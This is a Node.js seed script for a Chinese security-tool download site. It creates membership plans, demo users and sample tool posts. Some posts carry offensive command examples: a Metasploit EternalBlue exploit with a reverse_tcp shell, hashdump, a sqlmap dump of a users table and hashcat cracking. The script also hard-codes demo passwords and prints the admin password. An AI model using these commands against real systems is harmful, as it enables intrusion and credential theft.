'use strict';

/**
 * 初始化数据：分类、标签、示例资源、会员套餐、广告位、公告、友链、管理员账号。
 * 仅在数据库为空（或使用 --reset）时写入，不会覆盖已有运营数据。
 */

const store = require('./store');
const config = require('../config');
const { hashPassword } = require('../utils/password');
const { DEFAULTS } = require('../services/settings');

const CATEGORIES = [
  { name: '渗透测试工具', slug: 'penetration', icon: '🎯', sort: 1, description: '信息收集、漏洞利用、后渗透等实战工具' },
  { name: '抓包与流量分析', slug: 'traffic', icon: '📡', sort: 2, description: 'HTTP/HTTPS 抓包、协议分析与流量审计' },
  { name: '逆向工程与调试', slug: 'reverse', icon: '🔬', sort: 3, description: '反汇编、动态调试、二进制分析工具' },
  { name: '漏洞扫描与评估', slug: 'scanner', icon: '🛡️', sort: 4, description: '自动化漏洞扫描、合规检查与风险评估' },
  { name: '取证与应急响应', slug: 'forensics', icon: '🔍', sort: 5, description: '日志分析、内存取证、入侵排查工具' },
  { name: '加解密与密码工具', slug: 'crypto', icon: '🔐', sort: 6, description: '编解码、哈希破解、证书与密钥管理' },
  { name: '安全学习资料', slug: 'docs', icon: '📚', sort: 7, description: '教程、电子书、技术文档与实战笔记' },
  { name: 'CTF 竞赛资源', slug: 'ctf', icon: '🏆', sort: 8, description: 'CTF 靶场、WriteUp 与竞赛工具集' },
];

const TAGS = ['开源免费', 'Windows', 'Linux', 'macOS', '免安装', '中文界面', '命令行', '图形界面', 'Kali 内置', '单文件', 'Python', 'Java'];

const PLANS = [
  { name: '月度会员', days: 30, price: 1990, originalPrice: 2990, level: 1, sort: 1, active: true,
    features: ['全站 VIP 资源无限下载', '高速直链下载通道', '专属技术支持答疑', '会员专属资料合集'] },
  { name: '年度会员', days: 365, price: 9900, originalPrice: 19900, level: 2, sort: 2, active: true, recommend: true,
    features: ['全站 VIP 资源无限下载', '高速直链下载通道', '专属技术支持答疑', '会员专属资料合集', '新资源优先推送', '赠送 1000 积分'] },
  { name: '永久会员', days: 36500, price: 29900, originalPrice: 59900, level: 3, sort: 3, active: true,
    features: ['全站 VIP 资源终身下载', '最高优先级下载通道', '一对一技术指导', '全部资料合集打包', '新资源优先推送', '赠送 5000 积分'] },
];

const ADS = [
  { name: '首页顶部横幅', position: 'home_top', type: 'image', image: '', link: '', text: '广告位招租 · 首页顶部横幅 728×90', active: true, price: 30000 },
  { name: '侧边栏推荐位', position: 'sidebar', type: 'image', image: '', link: '', text: '广告位招租 · 侧边栏 300×250', active: true, price: 20000 },
  { name: '详情页顶部', position: 'detail_top', type: 'image', image: '', link: '', text: '广告位招租 · 详情页通栏 970×90', active: true, price: 25000 },
  { name: '全站右下角悬浮', position: 'float', type: 'html', image: '', link: '', html: '', text: '', active: false, price: 40000 },
];

const POSTS = [
  {
    title: 'Nmap 7.95 官方中文帮助手册 + 图形界面 Zenmap',
    type: 'software', categorySlug: 'penetration', accessLevel: 'free',
    version: '7.95', platform: 'Windows / Linux / macOS', language: '中文', size: '32 MB',
    official: 'https://nmap.org/', tags: ['开源免费', 'Windows', 'Linux', '命令行'],
    summary: 'Nmap 是最经典的网络探测与安全审计工具，支持主机发现、端口扫描、服务与版本识别、操作系统探测。本资源包含官方稳定版安装包与整理好的中文帮助手册。',
    content: `## 工具简介

**Nmap**（Network Mapper）是一款开源免费的网络安全扫描工具，被广泛用于网络资产测绘、端口开放情况探测与服务指纹识别。

## 核心能力

- 主机发现（Host Discovery）：快速判断目标网段存活主机
- 端口扫描（Port Scanning）：TCP/UDP 全端口探测
- 版本侦测（Version Detection）：识别服务类型与版本号
- OS 侦测：通过 TCP/IP 指纹推断目标操作系统
- NSE 脚本引擎：内置 600+ 脚本，覆盖漏洞检测、爆破、信息收集

## 常用命令速查

\`\`\`bash
# 快速扫描网段存活主机
nmap -sn 192.168.1.0/24

# 常见端口 + 服务版本探测
nmap -sV -T4 192.168.1.10

# 全端口扫描 + 操作系统识别
nmap -p- -O -sV 10.0.0.1

# 使用 NSE 脚本检测常见漏洞
nmap --script vuln 10.0.0.1
\`\`\`

## 合法使用提醒

> 请仅在**自己拥有或已获得书面授权**的网络环境中使用扫描工具。未经授权的扫描行为可能违反《网络安全法》与《刑法》第 285 条。

## 安装说明

1. 下载官方安装包后双击安装，建议勾选 Npcap 驱动
2. Windows 用户可将安装目录加入系统 PATH，方便命令行调用
3. Zenmap 图形界面适合新手，命令行版本适合脚本化批量操作`,
  },
  {
    title: 'Wireshark 4.4 网络协议分析器（含抓包权限配置教程）',
    type: 'software', categorySlug: 'traffic', accessLevel: 'free',
    version: '4.4.x', platform: 'Windows / Linux / macOS', language: '中文', size: '86 MB',
    official: 'https://www.wireshark.org/', tags: ['开源免费', 'Windows', 'Linux', '图形界面'],
    summary: '全球使用最广泛的网络协议分析工具，可实时捕获并深入解析上千种协议，是流量分析、故障排查与应急响应的必备利器。',
    content: `## 工具简介

Wireshark 是目前最流行的开源网络协议分析器，支持数百种协议的深度解析，能够把原始数据包还原为可读的会话内容。

## 典型场景

- 排查网络异常：定位丢包、重传、握手失败
- 安全分析：识别异常外联、C2 通信特征、明文凭据泄露
- 协议学习：直观查看 TCP 三次握手、TLS 握手全过程

## 实用过滤器

\`\`\`text
ip.addr == 192.168.1.100          # 指定 IP
tcp.port == 443                    # 指定端口
http.request.method == "POST"      # 只看 POST 请求
tls.handshake.type == 1            # 只看 Client Hello
dns.qry.name contains "example"    # DNS 查询包含关键字
\`\`\`

## 抓包失败怎么办

Windows 下首次安装需要安装 **Npcap** 驱动，并在安装时勾选“允许非管理员用户抓包”。若仍无法识别网卡，请以管理员身份运行。

## 学习建议

配合 SSLKEYLOGFILE 环境变量可解密 HTTPS 流量（需浏览器配合），具体步骤见资源包内《HTTPS 解密配置说明》。`,
  },
  {
    title: 'Burp Suite Community Edition 2025 社区版 + 汉化插件',
    type: 'software', categorySlug: 'penetration', accessLevel: 'login',
    version: '2025.x', platform: 'Windows / Linux / macOS', language: '中文', size: '420 MB',
    official: 'https://portswigger.net/burp/communitydownload', tags: ['Windows', '图形界面', 'Java'],
    summary: 'Web 安全测试的事实标准工具，集成拦截代理、爬虫、重放器、扫描器于一体。本资源为官方社区版，附常用汉化与实用插件配置说明。',
    content: `## 工具简介

Burp Suite 是 PortSwigger 出品的 Web 应用安全测试集成平台，社区版免费且功能已经足够覆盖日常测试需求。

## 社区版可用模块

| 模块 | 作用 | 社区版 |
| --- | --- | --- |
| Proxy | 拦截/修改 HTTP 请求 | 完整支持 |
| Repeater | 手动重放与调试请求 | 完整支持 |
| Intruder | 参数爆破与枚举 | 限速版 |
| Decoder | 编解码转换 | 完整支持 |
| Comparer | 响应差异对比 | 完整支持 |
| Scanner | 自动化漏洞扫描 | 仅专业版 |

## 快速上手

1. 安装 Java 17+ 运行环境
2. 启动后浏览器代理指向 \`127.0.0.1:8080\`
3. 访问 \`http://burp\` 下载并安装 CA 证书
4. 在 Proxy → Options 中配置拦截规则

## 常见问题

- **证书不被信任**：需把 CA 证书导入系统「受信任的根证书颁发机构」
- **乱码**：在 User Options 中把字符集设置为 UTF-8
- **卡顿**：关闭 Scope 之外的流量拦截，或调大 JVM 内存

> 请仅对已获得授权的目标进行测试。`,
  },
  {
    title: 'OWASP ZAP 2.15 开源 Web 漏洞扫描器',
    type: 'software', categorySlug: 'scanner', accessLevel: 'free',
    version: '2.15.0', platform: 'Windows / Linux / macOS', language: '中文', size: '210 MB',
    official: 'https://www.zaproxy.org/', tags: ['开源免费', 'Windows', 'Linux', '图形界面'],
    summary: 'OWASP 官方维护的免费 Web 应用安全扫描器，支持主动扫描、被动扫描、API 自动化，适合入门与 CI/CD 集成。',
    content: `## 为什么选择 ZAP

ZAP 完全开源免费，没有社区版/专业版的功能阉割，主动扫描能力可免费使用，是入门 Web 安全测试的绝佳选择。

## 三种扫描模式

- **被动扫描**：浏览器流量经过 ZAP 代理时自动分析，不影响业务
- **主动扫描**：主动发送攻击载荷验证漏洞，覆盖 SQL 注入、XSS、路径穿越等
- **自动化扫描**：通过命令行或 Docker 集成到 CI 流水线

## 命令行自动化

\`\`\`bash
# Docker 一键基线扫描（适合 CI）
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \\
  -t https://your-target.example.com -r report.html
\`\`\`

## 报告输出

扫描完成后可在 Report 菜单导出 HTML / PDF / JSON 报告，直接用于交付客户。`,
  },
  {
    title: 'Metasploit Framework 6.x 渗透测试框架（社区版）',
    type: 'software', categorySlug: 'penetration', accessLevel: 'vip',
    version: '6.x', platform: 'Kali / Linux / Windows', language: '中文', size: '1.2 GB',
    official: 'https://www.metasploit.com/', tags: ['开源免费', 'Kali 内置', 'Linux', '命令行'],
    summary: '全球最流行的渗透测试框架，内置数千个漏洞利用模块与后渗透载荷，是内网渗透与漏洞验证的核心工具链。',
    content: `## 框架概览

Metasploit Framework 提供从**信息收集 → 漏洞利用 → 权限提升 → 后渗透 → 权限维持**的完整能力闭环。

## 基础工作流

\`\`\`bash
msfconsole                    # 启动控制台
search ms17-010               # 搜索模块
use exploit/windows/smb/ms17_010_eternalblue
show options                  # 查看参数
set RHOSTS 10.0.0.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.100
exploit
\`\`\`

## meterpreter 常用指令

| 指令 | 说明 |
| --- | --- |
| sysinfo | 查看目标系统信息 |
| hashdump | 导出本地哈希 |
| getsystem | 尝试提权 |
| screenshot | 屏幕截图 |
| portfwd | 端口转发 |

> 本框架仅可用于获得授权的渗透测试、CTF 竞赛与安全研究。`,
  },
  {
    title: 'Ghidra 11 逆向工程套件（NSA 开源反编译神器）',
    type: 'software', categorySlug: 'reverse', accessLevel: 'free',
    version: '11.x', platform: 'Windows / Linux / macOS', language: '中文', size: '1.1 GB',
    official: 'https://ghidra-sre.org/', tags: ['开源免费', 'Windows', 'Linux', 'Java'],
    summary: '美国国家安全局开源的反汇编与反编译套件，支持多架构二进制分析、协作式逆向与脚本扩展，是 IDA 的免费替代方案。',
    content: `## 核心特性

- 多平台支持：x86/x64、ARM、MIPS、PowerPC、RISC-V 等
- 高可读性反编译输出，接近 C 代码
- 可扩展脚本引擎（Java / Python）
- 团队协作服务器，支持多人同步分析

## 典型用途

- 恶意样本静态分析，还原核心行为逻辑
- 漏洞挖掘：定位危险函数调用与边界问题
- CTF 逆向题求解

## 使用提示

Ghidra 需要 JDK 17 或更高版本，启动前请确认 \`JAVA_HOME\` 配置正确。资源包内含《Ghidra 入门到实战》中文笔记。`,
  },
  {
    title: 'x64dbg / x32dbg 动态调试器（含常用插件包）',
    type: 'software', categorySlug: 'reverse', accessLevel: 'login',
    version: '2025.x', platform: 'Windows', language: '中文', size: '45 MB',
    official: 'https://x64dbg.com/', tags: ['开源免费', 'Windows', '单文件'],
    summary: 'Windows 平台最受欢迎的开源动态调试器，界面友好、插件生态丰富，适合恶意代码动态分析与程序行为跟踪。',
    content: `## 为什么用它

相比 OllyDbg，x64dbg 原生支持 64 位程序，且持续更新维护，是当前 Windows 逆向的首选调试器。

## 推荐插件

| 插件 | 作用 |
| --- | --- |
| ScyllaHide | 反反调试，规避常见检测 |
| xAnalyzer | 自动注释 API 参数 |
| Scylla | 修复被 dump 程序的导入表 |
| TitanHide | 内核级隐藏调试器痕迹 |

## 调试技巧

1. 断点优先级：API 断点 → 内存断点 → 硬件断点 → 条件断点
2. 结合 Process Monitor 观察文件与注册表行为
3. 分析加壳样本时先运行脚本脱壳，再静态分析

> 请在合法授权前提下用于安全研究，禁止用于破解商业软件授权。`,
  },
  {
    title: 'SQLMap 1.9 自动化 SQL 注入检测与利用工具',
    type: 'software', categorySlug: 'penetration', accessLevel: 'free',
    version: '1.9.x', platform: 'Windows / Linux / Kali', language: '中文', size: '28 MB',
    official: 'https://sqlmap.org/', tags: ['开源免费', 'Python', 'Kali 内置', '命令行'],
    summary: '开源自动化 SQL 注入检测工具，支持六种注入技术、数据库指纹识别、数据导出与操作系统接管。',
    content: `## 支持的注入类型

- 布尔盲注 / 时间盲注
- 报错注入
- 联合查询注入
- 堆叠查询注入
- 带外（OOB）注入

## 常用命令

\`\`\`bash
# 基础检测
sqlmap -u "http://target/news.php?id=1"

# 指定 POST 参数
sqlmap -u "http://target/login.php" --data="user=1&pass=2"

# 读取数据库列表并导出表
sqlmap -u "http://target/news.php?id=1" --dbs
sqlmap -u "http://target/news.php?id=1" -D appdb --tables
sqlmap -u "http://target/news.php?id=1" -D appdb -T users --dump

# 使用请求文件（便于携带 Cookie）
sqlmap -r request.txt --level 3 --risk 2
\`\`\`

## 注意事项

- 默认禁止高危操作，请勿随意使用 \`--os-shell\` 等参数
- 未经授权的注入测试属于违法行为，务必取得书面授权`,
  },
  {
    title: 'Yakit 国产安全测试平台（含 MITM 与插件商店）',
    type: 'software', categorySlug: 'penetration', accessLevel: 'vip',
    version: '1.4.x', platform: 'Windows / Linux / macOS', language: '中文', size: '180 MB',
    official: 'https://www.yaklang.com/', tags: ['Windows', '中文界面', '图形界面'],
    summary: '国产开源的一站式安全测试平台，集 MITM 抓包、漏洞检测、热加载插件、Web Fuzzer 于一体，中文体验友好。',
    content: `## 平台亮点

- **MITM 交互式劫持**：图形化抓包改包，可一键将历史请求发送到 Web Fuzzer
- **插件商店**：社区插件一键安装，覆盖常见漏洞 POC
- **Yak 脚本语言**：低门槛编写自定义检测逻辑
- **反连平台**：内置 DNS/HTTP 反连，便于验证盲注与命令执行

## 适用人群

入门的 Web 安全学习者、需要快速验证漏洞的安全工程师、CTF 选手。

## 使用流程

1. 启动 MITM 并安装证书
2. 浏览目标站点，流量自动进入历史记录
3. 选中请求 → 右键发送到 Web Fuzzer → 构造测试载荷
4. 结合插件市场中的 POC 快速验证`,
  },
  {
    title: 'Nessus Essentials 免费版漏洞扫描器（16 IP 授权）',
    type: 'software', categorySlug: 'scanner', accessLevel: 'login',
    version: '10.x', platform: 'Windows / Linux', language: '中文', size: '120 MB',
    official: 'https://www.tenable.com/products/nessus/nessus-essentials', tags: ['Windows', 'Linux', '图形界面'],
    summary: 'Tenable 官方提供的免费漏洞扫描器，个人使用可免费扫描 16 个 IP，插件库覆盖 8 万+ 漏洞检测项。',
    content: `## 免费额度说明

Nessus Essentials 面向个人学习与家庭网络，注册邮箱即可获得激活码，支持 16 个 IP 的扫描授权。

## 扫描策略

| 策略 | 用途 |
| --- | --- |
| Basic Network Scan | 通用资产扫描 |
| Advanced Scan | 自定义插件与端口 |
| Host Discovery | 仅做资产发现 |
| Web Application Tests | Web 层面检测 |

## 结果解读

扫描报告按 **Critical / High / Medium / Low / Info** 分级，建议优先修复 Critical 与 High 项，并结合 CVE 编号查询官方补丁。`,
  },
  {
    title: '等保 2.0 测评实施指南与全套模板（2026 整理版）',
    type: 'doc', categorySlug: 'docs', accessLevel: 'vip',
    version: '2026', platform: '全平台', language: '中文', size: '156 MB',
    official: '', tags: ['中文界面', 'Python'],
    summary: '面向等保测评从业者的实战资料包：定级备案流程、测评项解读、整改建议、报告模板、常见扣分点汇总。',
    content: `## 资料包含

1. 《网络安全等级保护基本要求》条款逐条解读
2. 定级报告 / 备案表 / 测评方案模板（Word 可编辑）
3. 十个高风险测评项与整改实例
4. 三级系统测评报告范例（脱敏版）
5. 常用检查命令与配置基线脚本

## 适合人群

- 准备从事等保测评的新人
- 需要配合甲方过测评的运维与安全工程师
- 企业安全合规负责人

## 学习路径建议

先掌握**基本要求 → 测评要求 → 高风险项判定**三段主线，再对照模板动手写一遍完整测评方案。`,
  },
  {
    title: 'Web 安全渗透测试实战学习路线图 + 靶场推荐',
    type: 'doc', categorySlug: 'docs', accessLevel: 'free',
    version: '2026', platform: '全平台', language: '中文', size: '24 MB',
    official: '', tags: ['中文界面'],
    summary: '从 0 到 1 的 Web 安全学习路线：基础知识 → 漏洞原理 → 靶场实战 → 工具链 → 面试准备，附带学习资源清单。',
    content: `## 路线总览

\`\`\`text
第一阶段  基础打底   HTTP/HTML/JS、Linux 命令、数据库基础
第二阶段  漏洞原理   SQL 注入、XSS、CSRF、SSRF、文件上传、命令执行
第三阶段  靶场实战   DVWA → Pikachu → SQLi-Labs → 靶场综合
第四阶段  工具链     Burp / sqlmap / Nmap / 蚁剑
第五阶段  综合提升   内网渗透、代码审计、CTF 真题
\`\`\`

## 推荐靶场

| 靶场 | 定位 | 难度 |
| --- | --- | --- |
| DVWA | 入门首选 | ★ |
| Pikachu | 漏洞类型全面 | ★★ |
| SQLi-Labs | SQL 注入专项 | ★★ |
| VulnHub | 综合渗透虚拟机 | ★★★ |

## 学习建议

只看教程不动手等于没学。建议每学完一个漏洞类型，立刻在靶场复现一遍并写一份自己的笔记。`,
  },
  {
    title: 'CTF 竞赛工具集与常用脚本（2026 更新）',
    type: 'doc', categorySlug: 'ctf', accessLevel: 'vip',
    version: '2026', platform: 'Linux / Windows', language: '中文', size: '320 MB',
    official: '', tags: ['Python', 'Linux', '中文界面'],
    summary: 'CTF 各方向常用工具与大牛脚本合集：MISC 隐写、Crypto 解密、PWN 调试、Web 利用脚本，附常见题型解题思路。',
    content: `## 分类工具

- **MISC**：Stegsolve、zsteg、Binwalk、foremost、Audacity
- **Crypto**：CyberChef、RsaCtfTool、hashcat、sage 脚本合集
- **PWN**：pwntools 模板、ROPgadget、one_gadget、libc 数据库
- **Web**：php 反序列化链、JWT 攻击脚本、SSTI 探测字典
- **Reverse**：Ghidra 脚本、Python 反编译、APK 逆向工具链

## 使用建议

工具只是放大器，真正的差距在于**对原理的理解**。建议先用工具解出题目，再手写复现一遍核心逻辑。`,
  },
  {
    title: '火绒安全软件 6.0 个人版（含离线病毒库）',
    type: 'software', categorySlug: 'forensics', accessLevel: 'free',
    version: '6.0', platform: 'Windows', language: '中文', size: '180 MB',
    official: 'https://www.huorong.cn/', tags: ['Windows', '中文界面', '免费'],
    summary: '国产轻量级安全软件，占用低、弹窗少，适合作为个人主机的基础防护，同时可用于恶意样本的静态检测辅助。',
    content: `## 特点

- 资源占用低，老机器友好
- 广告弹窗拦截能力强
- 附带火绒剑（系统行为分析工具），适合安全分析人员

## 火绒剑能力

- 进程、线程、模块、句柄全维度查看
- 网络连接与注册表实时监控
- 可用于排查可疑进程与持久化项

> 建议仅从官方网站下载安装，避免第三方渠道捆绑。`,
  },
  {
    title: 'HashCat 6.2 密码恢复工具（GPU 加速）',
    type: 'software', categorySlug: 'crypto', accessLevel: 'login',
    version: '6.2.x', platform: 'Windows / Linux', language: '中文', size: '95 MB',
    official: 'https://hashcat.net/hashcat/', tags: ['开源免费', 'Windows', 'Linux', '命令行'],
    summary: '世界最快的开源密码恢复工具，支持 300+ 哈希类型与 GPU 多卡加速，可配合规则字典大幅提升效率。',
    content: `## 基础用法

\`\`\`bash
# 字典攻击
hashcat -m 0 -a 0 hash.txt rockyou.txt

# 规则增强
hashcat -m 0 -a 0 hash.txt rockyou.txt -r rules/best64.rule

# 掩码爆破（8 位纯数字）
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d

# 查看已破解结果
hashcat -m 0 hash.txt --show
\`\`\`

## 常见哈希类型编号

| -m 值 | 类型 |
| --- | --- |
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1400 | SHA256 |
| 3200 | bcrypt |
| 1800 | sha512crypt |

> 仅可用于自己的密码恢复、授权渗透测试与教学场景。`,
  },
  {
    title: 'Process Hacker / System Informer 进程分析工具',
    type: 'software', categorySlug: 'forensics', accessLevel: 'free',
    version: '3.1.x', platform: 'Windows', language: '中文', size: '12 MB',
    official: 'https://systeminformer.sourceforge.io/', tags: ['开源免费', 'Windows', '免安装', '单文件'],
    summary: '功能远超任务管理器的系统监控工具，可查看句柄、内存、网络连接、服务与驱动，应对木马排查十分高效。',
    content: `## 相比任务管理器的优势

- 查看进程完整命令行与父进程链
- 内存搜索：定位可疑字符串、URL、IP
- 网络页签：实时查看每个进程的外联连接
- 句柄与模块：快速发现注入的 DLL

## 应急排查思路

1. 按 CPU / 网络排序找异常进程
2. 检查进程签名与路径是否为系统目录
3. 右键 → 属性 → 查看命令行与父进程
4. 内存搜索提取 C2 地址
5. 结束进程并清理持久化项（计划任务 / 注册表 Run 键）`,
  },
  {
    title: 'Fiddler Classic 抓包工具（手机 App 抓包配置全解）',
    type: 'software', categorySlug: 'traffic', accessLevel: 'free',
    version: '5.x', platform: 'Windows', language: '中文', size: '6 MB',
    official: 'https://www.telerik.com/fiddler', tags: ['Windows', '中文界面', '免费'],
    summary: '轻量级 HTTP/HTTPS 抓包代理工具，配置简单，特别适合做 App 抓包与接口调试。附安卓/iOS 抓包完整配置流程。',
    content: `## 抓包配置三步走

**第一步：开启 HTTPS 解密**

Tools → Options → HTTPS → 勾选 Capture HTTPS CONNECTs 与 Decrypt HTTPS traffic，安装根证书。

**第二步：允许远程连接**

Tools → Options → Connections → 勾选 Allow remote computers to connect，端口默认 8888，重启生效。

**第三步：手机端设置**

1. 手机与电脑连同一 Wi-Fi
2. 手机 Wi-Fi 高级设置里填写电脑 IP 与端口 8888
3. 浏览器访问 \`http://电脑IP:8888\` 下载证书并安装
4. 安卓 7.0+ 需将证书安装到系统证书区（需 root）或用 VirtualXposed 等方案

## 常见问题

- **App 提示网络异常**：多半是 SSL Pinning，需配合 Frida 绕过
- **只能看到 CONNECT**：证书未正确安装或被系统信任链拒绝`,
  },
  {
    title: '应急响应实战手册：从告警到溯源全流程',
    type: 'doc', categorySlug: 'forensics', accessLevel: 'vip',
    version: '2026', platform: '全平台', language: '中文', size: '88 MB',
    official: '', tags: ['中文界面'],
    summary: '一线应急响应工程师整理的实战手册：入侵痕迹排查、日志分析、样本提取、溯源反制与报告撰写模板。',
    content: `## 排查清单（Windows）

| 排查项 | 命令 / 位置 |
| --- | --- |
| 账户异常 | \`net user\` / \`net localgroup administrators\` |
| 计划任务 | \`schtasks /query\` |
| 启动项 | 注册表 Run 键、启动文件夹 |
| 服务 | \`sc query\` / services.msc |
| 网络连接 | \`netstat -ano\` |
| 日志 | 事件查看器 4624/4625/4672/7045 |

## 排查清单（Linux）

\`\`\`bash
last -a                 # 登录记录
cat /etc/passwd         # 异常账户
crontab -l              # 计划任务
ls -la /tmp /var/tmp    # 可疑文件
cat ~/.bash_history     # 操作历史
netstat -antp           # 连接与进程
grep -r "curl" /etc/cron* 2>/dev/null
\`\`\`

## 溯源思路

1. 提取样本 → 沙箱行为分析 → 定位 C2 域名 / IP
2. 通过 C2 特征做全网资产测绘，找出同源受害主机
3. 结合流量日志还原攻击链，形成完整时间线
4. 输出报告：事件概述、影响范围、处置措施、加固建议`,
  },
  {
    title: '内网渗透测试知识图谱与常用命令速查',
    type: 'doc', categorySlug: 'docs', accessLevel: 'login',
    version: '2026', platform: '全平台', language: '中文', size: '18 MB',
    official: '', tags: ['中文界面'],
    summary: '内网渗透全流程知识梳理：信息收集、横向移动、权限提升、域内渗透、隧道代理与免杀思路，附带命令速查表。',
    content: `## 知识框架

\`\`\`text
信息收集 → 权限提升 → 凭据获取 → 横向移动 → 域控攻击 → 权限维持 → 痕迹清理
\`\`\`

## 横向移动常见手法

- 哈希传递（Pass The Hash）
- 票据传递（Pass The Ticket / 黄金票据）
- 远程服务利用（WMI / PsExec / WinRM / SMB）
- RDP 劫持与凭据复用

## 隧道与代理

| 工具 | 场景 |
| --- | --- |
| frp | 反向端口映射 |
| Neo-reGeorg | HTTP 隧道复用 |
| Stowaway | 多层内网代理 |
| Venom | 交互式多级代理 |

> 所有技术仅用于明确授权的渗透测试项目，未授权使用属于违法行为。`,
  },
  {
    title: 'CyberChef 在线编解码工具（含离线版）',
    type: 'software', categorySlug: 'crypto', accessLevel: 'free',
    version: '10.x', platform: 'Web / Windows', language: '中文', size: '20 MB',
    official: 'https://gchq.github.io/CyberChef/', tags: ['开源免费', 'Windows', '中文界面'],
    summary: '英国 GCHQ 出品的“网络瑞士军刀”，支持 400+ 种编码、加密、解析操作，CTT 与应急分析中处理数据的高效工具。',
    content: `## 典型用法

- 一键完成 Base64 / Hex / URL 多层解码
- JWT 解析与签名校验
- 正则批量提取 IP、域名、邮箱
- 时间戳与多种时间格式互转
- 文件魔数与哈希识别

## 离线部署

资源包内含开源离线版本，双击 index.html 即可在断网环境中使用，适合内网分析场景。`,
  },
];

const ANNOUNCEMENTS = [
  { title: '站点上线公告', content: '欢迎来到安全资源站！本站专注分享高质量网络安全工具与学习资料，注册即可获得初始积分。', pinned: true, active: true },
  { title: '关于资源安全性的说明', content: '所有工具均来自官方渠道或开源项目，下载后请自行校验哈希值。请勿从第三方渠道下载本站同名资源。', pinned: false, active: true },
  { title: '会员权益升级通知', content: '年度会员新增专属资料合集与新资源优先推送权益，详见会员页面。', pinned: false, active: true },
];

const LINKS = [
  { name: 'Nmap 官网', url: 'https://nmap.org/', sort: 1, active: true },
  { name: 'OWASP 中国', url: 'https://owasp.org/', sort: 2, active: true },
  { name: 'PortSwigger 学院', url: 'https://portswigger.net/web-security', sort: 3, active: true },
  { name: 'Kali Linux', url: 'https://www.kali.org/', sort: 4, active: true },
  { name: '国家信息安全漏洞库', url: 'https://www.cnnvd.org.cn/', sort: 5, active: true },
];

function seed({ force = false, reset = false } = {}) {
  if (reset) {
    store.data.users = [];
    store.data.posts = [];
    store.data.categories = [];
    store.data.tags = [];
    store.data.plans = [];
    store.data.ads = [];
    store.data.announcements = [];
    store.data.links = [];
    store.data.orders = [];
    store.data.comments = [];
    store.data.downloads = [];
    store.data.favorites = [];
    store.data.notices = [];
    store.data.sessions = [];
    store.data.visits = [];
    store.data.counters = { post: 0, user: 0, order: 0 };
  }

  const isEmpty = store.count('posts') === 0 && store.count('users') === 0;
  if (!isEmpty && !force) return false;

  // 站点设置
  store.setSettings(Object.assign({}, DEFAULTS));

  // 管理员
  if (!store.findOne('users', (u) => u.role === 'admin')) {
    store.insert('users', {
      username: config.admin.username,
      email: `${config.admin.username}@example.com`,
      password: hashPassword(config.admin.password),
      role: 'admin',
      nickname: config.admin.nickname,
      status: 'active',
      points: 99999,
      vipLevel: 9,
      vipExpireAt: null,
      avatar: '',
    });
  }

  // 演示用户
  if (store.count('users') < 3) {
    store.insert('users', {
      username: 'demo', email: 'demo@example.com', password: hashPassword('demo1234'),
      role: 'user', nickname: '演示用户', status: 'active', points: 100,
      vipLevel: 2, vipExpireAt: new Date(Date.now() + 300 * 86400000).toISOString(),
    });
    store.insert('users', {
      username: 'freeuser', email: 'free@example.com', password: hashPassword('free1234'),
      role: 'user', nickname: '普通用户', status: 'active', points: 20,
      vipLevel: 0, vipExpireAt: null,
    });
  }

  // 分类
  const catMap = {};
  CATEGORIES.forEach((c) => {
    const row = store.findOne('categories', (x) => x.slug === c.slug) || store.insert('categories', c);
    catMap[c.slug] = row.id;
  });

  // 标签
  TAGS.forEach((t) => {
    if (!store.findOne('tags', (x) => x.name === t)) store.insert('tags', { name: t, slug: t, count: 0 });
  });

  // 套餐
  if (store.count('plans') === 0) PLANS.forEach((p) => store.insert('plans', p));

  // 广告位
  if (store.count('ads') === 0) ADS.forEach((a) => store.insert('ads', a));

  // 公告 / 友链
  if (store.count('announcements') === 0) ANNOUNCEMENTS.forEach((a) => store.insert('announcements', a));
  if (store.count('links') === 0) LINKS.forEach((l) => store.insert('links', l));

  // 内容
  if (store.count('posts') === 0) {
    const permalink = require('../services/permalink');
    POSTS.forEach((p, i) => {
      const { categorySlug, ...rest } = p;
      const publishedAt = new Date(Date.now() - i * 36 * 3600000).toISOString();
      store.insert('posts', Object.assign(rest, {
        categoryId: catMap[categorySlug] || null,
        slug: permalink.uniqueSlug(permalink.generateSlug(p.title, i + 1), i + 1),
        status: 'published',
        views: Math.floor(Math.random() * 8000) + 800,
        downloads: Math.floor(Math.random() * 3000) + 120,
        top: i < 2,
        featured: i < 6,
        recommended: i % 3 === 0,
        cover: '',
        downloadUrl: '',
        downloadCode: '',
        unzipPassword: '',
        fileHash: '',
        pointsPrice: p.accessLevel === 'points' ? 20 : 0,
        price: p.accessLevel === 'paid' ? 990 : 0,
        author: '站长',
        publishedAt,
      }));
    });
    // 让标签计数与实际内容对齐
    require('../services/content').syncTagCounts();
  }

  store.flush();
  return true;
}

if (require.main === module) {
  store.load();
  const reset = process.argv.includes('--reset');
  const done = seed({ force: true, reset });
  console.log(done ? '✅ 初始化数据完成' : 'ℹ️ 数据已存在，跳过初始化');
  console.log(`   数据文件: ${config.paths.dbFile}`);
  console.log(`   管理员账号: ${config.admin.username} / ${config.admin.password}`);
  store.flush();
}

module.exports = { seed };
